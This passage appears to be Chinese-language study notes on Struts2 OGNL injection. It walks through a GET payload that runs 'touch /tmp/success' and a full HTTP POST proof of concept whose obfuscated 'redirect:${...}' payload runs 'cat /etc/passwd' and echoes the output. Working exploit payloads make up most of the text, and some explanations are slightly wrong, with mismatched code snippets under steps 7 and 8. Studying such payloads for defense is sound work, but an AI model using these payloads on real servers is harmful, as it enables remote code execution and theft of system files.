       ('%5cu0023rt.exec(%22touch@/tmp/success%22.split(%22@%22))')
       (%5cu0023rt%5cu003d@java.lang.Runtime@getRuntime())
   )=1
       
   ####
   (asdf)(
       ('#rt.exec("touch@/tmp/success".split("@"))')
       (#rt=@java.lang.Runtime@getRuntime())
   )=1
   ```

   1. `('%5cu0023rt.exec(%22touch@/tmp/success%22.split(%22@%22))')` 这部分的作用是执行命令 `touch /tmp/success`。这里 `%5cu0023rt` 是一个变量，它将在下一步被赋值。`exec` 是 `java.lang.Runtime` 类的一个方法，用于执行系统命令。参数是一个字符串数组，这里使用了 `split("@")` 方法将 `"touch@/tmp/success"` 字符串分割成数组。
   2. `(%5cu0023rt%5cu003d@java.lang.Runtime@getRuntime())` 这部分的作用是获取 Java 的运行时环境，并将其赋值给 `#rt` 变量。`@java.lang.Runtime@getRuntime()` 是 OGNL 表达式，它使用 `@` 符号调用了静态方法 `java.lang.Runtime.getRuntime()`，该方法返回当前 Java 应用的运行时环境。

   至于前面的 `(asdf)`，这是一个无效的表达式，它并没有实际的作用，只是增加了 payload 的混淆程度。

   `=1` 这部分也并没有实际的功能。在一个典型的 HTTP GET 请求中，参数是以键值对的形式存在的，如 `key=value`，而 `=1` 就符合这种格式。

   总的来说，这段 payload 的实际效果是：首先获取 Java 的运行时环境，然后利用这个运行时环境执行命令 `touch /tmp/success`，创建一个名为 `success` 的文件在 `/tmp` 目录下。

----

执行任意命令POC（有回显，将需要执行的命令进行urlencode编码）:

```http
POST /example/HelloWorld.action HTTP/1.1
Accept: application/x-shockwave-flash, image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; MAXTHON 2.0)
Host: 192.168.1.215:8081
Content-Length: 626

redirect:${%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23s%3dnew%20java.util.Scanner((new%20java.lang.ProcessBuilder(%27%63%61%74%20%2f%65%74%63%2f%70%61%73%73%77%64%27.toString().split(%27\\s%27))).start().getInputStream()).useDelimiter(%27\\AAAA%27),%23str%3d%23s.hasNext()?%23s.next():%27%27,%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27UTF-8%27),%23resp.getWriter().println(%23str),%23resp.getWriter().flush(),%23resp.getWriter().close()}

```

![image-20230608152737120](http://cdn.ayusummer233.top/DailyNotes/202309141817044.png)

在 Struts2 中，`redirect:` 是一个特殊的跳转标记，用于指示请求的处理结果需要进行重定向。`${}` 是一种用于表达式求值的语法。它可以用于获取、设置和操作请求中的属性值, 通过在 `${...}` 中嵌入恶意代码，攻击者可以执行任意的 Java 代码

在这个 payload 中，通过将 `redirect:` 设置为 `redirect:${...}`，实际上是在请求中使用了一个自定义的跳转路径，并在跳转路径中嵌入了恶意代码。

```java
%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),

%23s%3dnew%20java.util.Scanner((new%20java.lang.ProcessBuilder(%27%63%61%74%20%2f%65%74%63%2f%70%61%73%73%77%64%27.toString().split(%27\\s%27))).start().getInputStream()).useDelimiter(%27\\AAAA%27),

%23str%3d%23s.hasNext()?%23s.next():%27%27,

%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),

%23resp.setCharacterEncoding(%27UTF-8%27),

%23resp.getWriter().println(%23str),

%23resp.getWriter().flush(),%23resp.getWriter().close()
```

1. `%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27)` 部分将从 `context` 对象中获取 `com.opensymphony.xwork2.dispatcher.HttpServletRequest` 对象，并将其赋值给 `req` 变量。

   ```java
   %23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27)
       
   ###
   #req=#context.get('co'+'m.open'+'symphony.xwo'+'rk2.disp'+'atcher.HttpSer'+'vletReq'+'uest')
   ```

2. `%23s%3dnew%20java.util.Scanner((new%20java.lang.ProcessBuilder(%27%63%61%74%20%2f%65%74%63%2f%70%61%73%73%77%64%27.toString().split(%27\\s%27))).start().getInputStream())` 部分创建了一个 `Scanner` 对象 `s`，并将其初始化为执行命令 `cat /etc/passwd` 的结果。

   ```java
   %23s%3dnew%20java.util.Scanner((new%20java.lang.ProcessBuilder(%27%63%61%74%20%2f%65%74%63%2f%70%61%73%73%77%64%27.toString().split(%27\\s%27))).start().getInputStream()).useDelimiter(%27\\AAAA%27)
       
   ####
   #s=new java.util.Scanner((new java.lang.ProcessBuilder('cat /etc/passwd'.toString().split('\\s'))).start().getInputStream()).useDelimiter('\\AAAA'),
   ```

   `.useDelimiter(%27\\AAAA%27)` 是针对 `java.util.Scanner` 对象设置分隔符为 `\AAAA`, 这个字符串并不是特定的含义，可以是任意值。

   设置分隔符为 `%27\\AAAA%27` 的作用是告诉 `Scanner` 对象在扫描输入文本时，以 `%27\AAAA%27` 作为分隔符，将输入文本切割成多个部分。这样，攻击者可以利用特定的分隔符来构造输入，使得 `Scanner` 在扫描过程中将输入解析成恶意的代码片段。

3. `%23str%3d%23s.hasNext()?%23s.next():%27%27` 部分将执行 `s.hasNext()` 方法判断是否还有输入内容，如果有则调用 `s.next()` 方法获取输入内容并将其赋值给 `str` 变量，如果没有则将空字符串赋值给 `str` 变量。

   ```java
   %23str%3d%23s.hasNext()?%23s.next():%27%27
   ####
   #str=#s.hasNext()?#s.next():''
   ```

4. `%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27)` 部分从 `context` 对象中获取 `com.opensymphony.xwork2.dispatcher.HttpServletResponse` 对象，并将其赋值给 `resp` 变量。

   ```java
   %23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),
   
   ####
   #resp=#context.get('co'+'m.open'+'symphony.xwo'+'rk2.disp'+'atcher.HttpSer'+'vletRes'+'ponse'),
   ```

5. `%23resp.setCharacterEncoding(%27UTF-8%27)` 部分设置响应的字符编码为 `UTF-8`。

   ```java
   %23resp.setCharacterEncoding(%27UTF-8%27)
   ####
   #resp.setCharacterEncoding('UTF-8')
   ```

6. `%23resp.getWriter().println(%23str)` 部分通过 `getWriter()` 方法获取 `PrintWriter` 对象，并使用 `println()` 方法将 `str` 写入响应输出流。

   ```java
   %23resp.getWriter().println(%23str)
   ####
   #resp.getWriter().println(#str)
   ```

7. `%23resp.getWriter().flush()` 部分刷新响应输出流。

   ```java
   %23resp.getWriter().println(%23str)
   ####
   #resp.getWriter().println(#str)
   ```

8. `%23resp.getWriter().close()` 部分关闭响应输出流。

   ```java
   %23resp.getWriter().flush(),%23resp.getWriter().close()
   ####
   #resp.getWriter().println(#str)
   ```

这个 payload 的目的是通过执行命令 `cat /etc/passwd` 并将结果写入响应输出流中，从而将 `/etc/passwd` 文件的内容返回给请求的客户端。



